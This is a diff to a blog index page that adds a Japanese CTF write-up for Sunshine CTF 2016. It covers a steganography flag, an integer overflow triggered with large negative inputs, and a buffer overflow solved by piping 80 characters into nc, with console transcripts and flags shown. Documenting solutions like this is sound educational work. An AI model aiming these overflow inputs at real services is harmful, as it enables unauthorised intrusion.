@@ -7,7 +7,7 @@
 
     <meta name="description" content="">
 
-    <meta name="generator" content="Hugo 0.18.1" />
+    <meta name="generator" content="Hugo 0.16" />
     <meta name="twitter:card" content="summary">
     
     <meta name="twitter:title" content="Posts &middot; urandom">
@@ -59,6 +59,209 @@
         <div>
             
             <div class="posts">
+                
+                <h1 class="content-subhead">15 Mar 2016, 01:42</h1>
+                <section class="post">
+                    <header class="post-header">
+
+                        <a href="//blog.urandom.team/post/sunshine-ctf-2016/" class="post-title">Sunshine CTF 2016 Write-up</a>
+
+                        <p class="post-meta">
+                            
+                                By <strong class="post-author">mayth</strong>
+                            
+                            
+                                under 
+                                
+                                <a class="post-category post-category-Write-ups" href="//blog.urandom.team/categories/write-ups">Write-ups</a>
+                            
+                        </p>
+                    </header>
+
+                    <div class="post-description">
+                        
+
+<p>2016-03-13 01:00 - 2016-03-14 05:00 (JST)に開催された<a href="http://ctf.bsidesorlando.org/">Sunshine CTF 2016</a>のwrite-upです。</p>
+
+<p>なお、今回は以下のメンバー編成で参加しました。</p>
+
+<ul>
+<li>mayth （土曜日を寝て潰す担当）</li>
+<li>op （たまに現れていくらかの助言と違法語句を残して去って行く担当）</li>
+</ul>
+
+<p>ESTはクソ。</p>
+
+<h1 id="forensics-50-butterfly-effect">Forensics 50: Butterfly Effect</h1>
+
+<p><code>butterfly.png</code>が与えられる。</p>
+
+<p><a href="http://www1.chapman.edu/~nabav100/ImgStegano/">ImgStegano</a>にファイルを読み込ませて&rdquo;Image &gt; Enhanced LSB&rdquo;とするとフラグが現れた。</p>
+
+<blockquote>
+<p>sun{RE4DY_THE_4CID_M4GNET!}</p>
+</blockquote>
+
+<h1 id="exploitation-50-alligatorsim95">Exploitation 50: alligatorsim95</h1>
+
+<blockquote>
+<p>Don&rsquo;t try to automate adding X eggs at a time</p>
+
+<p>legends circulate in florida of an alligator that had laid millions of eggs. use this simulator to try to achieve the same greatness</p>
+</blockquote>
+
+<p>※プログラムは与えられない。</p>
+
+<p>指定されたIPアドレス/ポートにncで接続すると、アリゲーターのAAと共に文章が流れてくる。</p>
+
+<pre><code>-&gt; u r... AN ALLIGATOR!!
+.. simulating alligator lifecycle ..
+.. simulating alligator throwing physics..
+-&gt; you got 1337 eggz in ur nest, how many you gonna lay alligator??
+</code></pre>
+
+<p>この後に整数値を入力すると、その数だけ卵の数（上記の通り初期値1337）が増える。ただし上限は50。それを超えると拒否され再度同様のプロンプトが現れる。接続を切られるのは以下の通り。</p>
+
+<ul>
+<li><code>echo</code>とかで入力を機械的に流し込もうとしたとき (&ldquo;Don&rsquo;t try to automate adding X eggs at a time&rdquo;)</li>
+<li>0や数字として解釈出来ない数を与えたとき</li>
+<li>一定時間が経過したとき</li>
+</ul>
+
+<p>この条件下で卵の数を大きくする問題。</p>
+
+<p>色々入力を試すと、0はダメだが負数を受け付けること、また、負数であれば絶対値がいくら大きくてもよいことがわかった。
+これを利用すると整数オーバーフローを引き起こすことができる。そうすると卵の数は非常に大きな値となり、フラグを得ることができる。</p>
+
+<pre><code>-&gt; u r... AN ALLIGATOR!!
+.. simulating alligator lifecycle ..
+.. simulating alligator throwing physics..
+-&gt; you got 1337 eggz in ur nest, how many you gonna lay alligator?? -2147483647
+~~ producing eggz ~~
+.. simulating alligator lifecycle ..
+.. simulating alligator throwing physics..
+-&gt; you got -2147482310 eggz in ur nest, how many you gonna lay alligator?? -10
+~~ producing eggz ~~
+.. simulating alligator lifecycle ..
+.. simulating alligator throwing physics..
+-&gt; you got -2147482320 eggz in ur nest, how many you gonna lay alligator?? -40000
+~~ producing eggz ~~
+-&gt; dang 2147444976 is a lotta eggs
+-&gt; as a god among gators here is ur crown:
+sun{int_0verflow_i5_a_g0od_st4rt}
+</code></pre>
+
+<blockquote>
+<p>sun{int_0verflow_i5_a_g0od_st4rt}</p>
+</blockquote>
+
+<h1 id="exploitation-55-dance">Exploitation 55: Dance</h1>
+
+<blockquote>
+<p>Some prefer the stanky leg, others prefer the dab, but what dance moves do you have?</p>
+</blockquote>
+
+<p>IPアドレスとポート番号が指定される。当初プログラムは与えられなかったが、後にフラグ部分を潰したバイナリが配布された。</p>
+
+<p>サーバーに接続すると以下のような文字が流れてくる。</p>
+
+<pre><code>welcome to the pro club. you just paid a door fee and have no respect. earn ur cred on the dancefloor!
+give us ur sick dance moves like so:
+whip,naenae,whip,whip,naenae&lt;ENTER&gt;
+</code></pre>
+
+<p><code>whip</code>か<code>naenae</code>をカンマ区切りで並べて送信すると</p>
+
+<pre><code>do the naenae
+(\)
+  \(:O)
+   /||\_
+_/¯    ¯\_
+</code></pre>
+
+<p>こんな感じで対応したアクションと愉快なAAが流れてくる。</p>
+
+<p>当初何をさせたいのかさっぱりわからなかったが、バイナリが配布されたのでそれを読んだ。</p>
+
+<p>その結果、こちらからの入力を受け取るバッファについて、<code>memset</code>で80bytesを<code>NULL</code>で初期化しているにも関わらず、<code>fgets</code>で最大89bytesまで読み込むようになっていることがわかった。また、0で初期化された特定の変数の値が書き換わっているときにフラグが表示されるようになっていることがわかった。</p>
+
+<p>入力の読み込みはだいたい次のようなロジックになっている。</p>
+
+<pre><code>while (strlen(buf) &gt; 0) {
+  if (*buf == 'n') {
+    buf += 7;
+    donaenae();
+  } else if (*buf == 'w') {
+    buf += 5;
+    dowhip();
+  }
+}
+check_flag();
+</code></pre>
+
+<p>先頭しか見てないっぽいので適当に80文字の&rdquo;n&rdquo;を送り付けたところ、フラグが得られた。</p>
+
+<pre><code>% ruby -e 'puts &quot;n&quot; * 0x50' | nc ****
+welcome to the pro club. you just paid a door fee and have no respect. earn ur cred on the dancefloor!
+give us ur sick dance moves like so:
+whip,naenae,whip,whip,naenae&lt;ENTER&gt;
+do the naenae
+(\)
+  \(:O)
+   /||\_
+_/¯    ¯\_
+(snip)
+do the naenae
+(\)
+  \(:O)
+   /||\_
+_/¯    ¯\_
+girl u can dance w the best of em. the pw to our vip lounge is: sun{d4nc3_0n_th3_s7ack}
+
+cool dance! come again!
+</code></pre>
+
+<blockquote>
+<p>sun{d4nc3_0n_th3_s7ack}</p>
+</blockquote>
+
+<h1 id="misc-50-find-floridaman">Misc 50: Find Floridaman</h1>
+
+<blockquote>
+<p>In other news&hellip; Floridaman did what with an alligator?</p>
+
+<p>Remember, this has the normal flag format.</p>
+
+<p>Hint: You need only look at comments from Florida-based news websites.</p>
+
+<p>Hint: Gator went threw a window!</p>
+
+<p>Hint: &ldquo;Flori-duh&rdquo;</p>
+
+<p>NOTE: Flag was posted before the 12th</p>
+</blockquote>
+
+<p>フロリダマンを探すマン。</p>
+
+<p>問題オープン当初は最初の2文だけだったのが、誰も解かないからか次々にヒントが追加されて結局ヒントが3つになった。</p>
+
+<p>ヒントが3つになってから、そのヒントを元に&rdquo;Flori-duh Alligator&rdquo;で探してみると、次の記事が見つかった。</p>
+
+<p><a href="http://www.mypalmbeachpost.com/news/news/crime-law/wendys-alligator-thrower-is-only-fulfilling-his-fl/nqNfr/">Wendy’s alligator-thrower is only fulfilling his Flori-duh destiny</a></p>
+
+<p>この記事のReader Commentsにフラグがある。</p>
+
+<blockquote>
+<p>Summerc137 3 days ago
+May the Lord have mercy on this man. That poor woman in the drivethrough! sun{1s_th1s_even_real_l1fe?}</p>
+
+<p>sun{1s_th1s_even_real_l1fe?}</p>
+</blockquote>
+
+<p>ちなみにこの事件、なんでも1mちょっとあるアリゲーターをWendy&rsquo;sのドライブスルーの窓から投げ込んだのだそうな。さすがアメリカ。</p>
+
+                    </div>
+                </section>
                 
                 <h1 class="content-subhead">21 Feb 2016, 17:42</h1>
                 <section class="post">
